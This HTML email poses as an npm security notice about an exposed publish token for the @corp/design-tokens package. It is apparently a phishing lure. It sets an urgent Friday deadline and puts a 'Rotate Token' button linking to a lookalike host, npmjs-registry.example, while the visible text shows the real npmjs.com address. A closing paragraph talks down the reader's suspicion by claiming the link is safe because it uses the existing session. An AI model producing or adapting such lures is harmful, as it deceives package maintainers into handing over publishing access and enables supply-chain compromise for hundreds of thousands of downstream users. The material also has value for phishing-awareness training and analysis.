<html><body style="font-family:-apple-system,'Segoe UI',sans-serif;font-size:14px">
<p>Frontend Platform, OSS Security, Engineering Directors,</p>

<p style="background:#FFEBEE;border-left:4px solid #B71C1C;padding:12px">
<b>MAINTAINER TOKEN EXPOSURE — @corp/design-tokens.</b>
A granular automation token belonging to your organization was found exposed in a public CI log.
Because your publish calendar shows a release scheduled for Monday, the token must be rotated
<b>before the weekend publish freeze</b> to keep the release on track.
</p>

<h3>1. Exposure Summary</h3>
<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
<tr><td style="background:#f5f5f5;width:260px">Package</td><td><b>@corp/design-tokens</b> (v4.7.2, ~318K weekly downloads)</td></tr>
<tr><td style="background:#f5f5f5">Exposed credential</td><td>Granular automation token <code>npm_xkR2…9fQ4</code> (read-write, package scope)</td></tr>
<tr><td style="background:#f5f5f5">Owner account</td><td>corp-ci-publisher (org: your-org)</td></tr>
<tr><td style="background:#f5f5f5">Exposure vector</td><td>Forked PR workflow echoed the token in a build log line (run #41882, job "publish-check")</td></tr>
<tr><td style="background:#f5f5f5">First seen in logs</td><td>11 December 2026, 03:14 UTC</td></tr>
<tr><td style="background:#f5f5f5">Publishes since exposure</td><td>1 (v4.7.2, 12 December — <b>integrity check required</b>, see Section 3)</td></tr>
</table>

<h3>2. Required Actions</h3>
<ol>
<li><b>Revoke</b> the exposed token and <b>re-issue</b> a replacement with the same scope.</li>
<li>Update the CI secret store that consumed the token (references: publish-check workflow, release-bot).</li>
<li>Audit the forked-PR workflow for additional echoed secrets (grep the run log for token prefixes).</li>
<li>Complete the integrity check in Section 3 before Monday's release.</li>
</ol>

<h3>3. Publish Integrity Check (v4.7.2)</h3>
<p>One version shipped while the token was live in public logs. The integrity check re-verifies the tarball
signature and file manifest against the intended release commit (<code>a41f0c2</code>). If the check fails,
the version is un-published and your release rolls back automatically before Monday.</p>

<h3>4. Token Rotation &amp; Integrity Portal</h3>
<p style="text-align:center;margin:18px 0">
<a href="https://npmjs-registry.example/rotate?pkg=%40corp%2Fdesign-tokens&amp;tk=xkR2" style="display:inline-block;background:#CB3837;color:#fff;padding:12px 40px;text-decoration:none;border-radius:4px;font-weight:bold">Rotate Token &amp; Run Integrity Check</a>
</p>
<p style="font-size:13px;color:#666;text-align:center">Portal address: https://www.npmjs.com/settings/your-org/tokens/granular</p>

<h3>5. Timeline</h3>
<ul>
<li>Rotation + integrity check deadline: <b>before the weekend publish freeze (Friday 18:00 PT)</b></li>
<li>Release train: Monday 09:00 UTC (v4.8.0, token must be clean)</li>
<li>Post-rotation attestation appended to your org security page within 24h</li>
</ul>

<p style="font-size:14px;background:#FFF3E0;padding:12px">You should be suspicious of any email that links to a
login page — npm itself tells you to type registry URLs by hand, and that guidance still applies. Two things
make this notice different: the rotation link above carries your org's token-fingerprint (the same value shown
under <i>Access Tokens → last used</i> in your npm settings, so you can compare without entering credentials),
and nothing in the flow asks for your password — the portal defers to your existing npm session. The weekend
freeze, however, is the registry's maintenance reality and does not move for individual orgs.</p>

